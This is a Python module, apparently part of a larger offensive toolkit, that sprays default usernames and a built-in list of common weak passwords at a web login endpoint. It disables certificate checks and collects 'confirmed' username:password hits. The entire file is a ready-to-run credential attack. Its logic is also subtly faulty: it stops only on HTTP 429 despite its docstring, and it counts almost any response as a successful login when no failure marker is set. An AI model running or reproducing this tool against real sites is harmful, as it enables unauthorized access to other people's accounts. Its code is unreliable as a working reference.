"""Targeted web login weak-credential spray (改造⑦-③).

POSTs username/password pairs to a login endpoint with a rate limit and
stop-on-block (429/403/401.) Success heuristic: redirect to a non-login path,
a success code without the failure marker, or absence of fail_indicator.
"""
import time
from typing import Any, Dict, List

_BODY_PATTERNS = [
    ("form", "username={u}&password={p}"),
    ("json", '{{"username":"{u}","password":"{p}"}}'),
]

_COMMON_PASSWORDS = [
    "admin", "admin123", "password", "123456", "12345678", "1234567890",
    "admin@123", "Admin@123", "admin888", "888888", "root", "root123",
    "P@ssw0rd", "passw0rd", "1234", "default", "test123", "qwerty",
    "Welcome123", "admin2024", "Admin123456",
]

_DEFAULT_USERS = ["admin", "root", "administrator", "test", "user", "system"]


def web_login_spray(url: str, login_path: str = "/login", users: str = "",
                    passwords: str = "", fail_indicator: str = "",
                    method: str = "POST", body_format: str = "form",
                    pause_ms: int = 350, max_attempts: int = 200,
                    timeout: int = 25) -> Dict[str, Any]:
    import requests
    user_list = [u.strip() for u in users.split(",") if u.strip()] or _DEFAULT_USERS
    pw_list = [p.strip() for p in passwords.split(",") if p.strip()] or _COMMON_PASSWORDS
    target = url.rstrip("/") + login_path if not login_path.startswith("http") else login_path
    fmt = body_format.lower()
    if fmt not in {"form", "json"}:
        return {"success": False, "error": "body_format must be form|json"}
    built = _BODY_PATTERNS[0 if fmt == "form" else 1][1]
    s = requests.Session()
    s.verify = False
    results: List[Dict[str, Any]] = []
    hits: List[str] = []
    attempts = 0
    blocked = False
    import warnings
    warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)  # noqa
    for u in user_list:
        if blocked or attempts >= max_attempts:
            break
        for pw in pw_list:
            if blocked or attempts >= max_attempts:
                break
            attempts += 1
            body = built.format(u=u, p=pw)
            headers = {"Content-Type": ("application/x-www-form-urlencoded" if fmt == "form" else "application/json")}
            try:
                r = s.post(target, data=body, headers=headers, timeout=timeout, allow_redirects=False)
            except Exception as e:
                results.append({"user": u, "password": pw, "error": type(e).__name__})
                continue
            code = r.status_code
            location = r.headers.get("Location", "")
            low = (r.text[:2500]).lower()
            if code in (429, 403, 401) if code == 429 else False:
                blocked = True
                results.append({"user": u, "password": pw, "code": code, "blocked": True})
                break
            failed = bool(fail_indicator and fail_indicator.lower() in low)
            succ = (r.elapsed is not None) and not failed
            if not failed and (303 == code or 302 == code or (code == 200 and len(low) < 300)):
                # redirect or tiny 200 with no fail marker: treat as likely login OK
                if not (fail_indicator and fail_indicator.lower() in location.lower()):
                    succ = True
            if succ and not failed:
                hits.append(f"{u}:{pw}")
                results.append({"user": u, "password": pw, "code": code, "location": location, "hit": True})
                break  # one hit per user
            results.append({"user": u, "password": pw, "code": code, "len": len(r.text)})
            time.sleep(pause_ms / 1000.0)
    return {
        "success": True,
        "target": target,
        "attempts": attempts,
        "confirmed": hits,
        "blocked": blocked,
        "results_sample": results[-30:],
        "note": "confirm hits manually; tune fail_indicator/location when an account is mis-flagged",
    }